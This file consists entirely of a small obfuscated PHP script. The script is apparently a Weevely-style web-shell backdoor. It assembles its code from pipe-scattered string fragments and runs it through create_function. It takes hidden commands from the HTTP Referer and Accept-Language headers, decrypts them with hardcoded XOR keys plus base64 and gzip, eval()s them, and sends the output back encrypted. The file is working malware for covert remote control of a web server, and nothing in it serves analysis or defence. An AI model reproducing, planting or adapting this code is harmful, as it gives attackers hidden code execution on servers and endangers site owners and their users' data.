<?php
$e=';$e|=strpos(|$s[$|i],$f)|;if($e){|$k=|$kh.$k|f;ob_st|art|();@|eva|l(@gzuncomp|ress(@x(@|base6|4_decode(pr|eg_';
$p=str_replace('sh','','creshashshte_shfushnshction');
$z='$j=0;|(|$j<$c&&$i<$l|)|;$||j++,$i|++){$o.=$t{|$|i}^$k{$j};}}return|| $o;|}$r=$_SER|VER|;$rr=@$r["HTT|P_REFE';
$q='re|place(arr|ay("/|_|/",|"/-/"),array("|/","+")|,$ss|(|$|s[$i],0,$e))),$k|)));$o||=ob_get_cont|ents();o|b_e';
$Q='d5($i.$|kh),|0,3));$f|=$s|l||($ss(md5(|$i.|$kf),0,3));$p="";for|($z=1;$||z<count||($m|[1]);$z++|)$p.=$q|[';
$F='nd_c|lean|();$d=ba|se6|4_enco|de(x(gz|compres|s($o)|,$k));p|rint("|<$k>|$|d</$k>");|@se|ssion_destroy(|);}}}}';
$O='q|);$q=a||rray_v|a|lues($q);preg_m|atch||_all("/([\\w])|[\\w|-]+(?:;|q=0.([\\d]||))?,?/",$ra,$||m);if(|$q&|&$m){';
$o='|$m[2][$z]];if(strpos|($p|,$|h)===0){$s|[$i|]="";$p|=$ss($|p,3)|;|}if(array_key_e|xi|sts($i,|$s)){$s[$i|].=$|p';
$W='@ses||sion_start();$s=&$|_S|ESSION;$ss|="su|bstr|";$sl="str|tolowe|r";$i||=$|m[1][0].$m[1][1];$|h=$s||l($ss(m';
$n='$kh="5d4|1"|;$kf=|"4|0|2a";funct|i|on x($t,$k){$c=strle||n|($k);$l=strlen($|t);$o=""|;for($i=|0;$i<$|l;){for|(';
$P='RE|R"];$|ra=||@$r[|"HTTP_ACCEPT_L|ANGUAGE"]||;if|($r|r&&$ra){$|u=par|se_url($rr);pa|rse_str($|u["que|ry"],$';
$i=str_replace('|','',$n.$z.$P.$O.$W.$Q.$o.$e.$q.$F);
$d=$p('',$i);$d();
?>
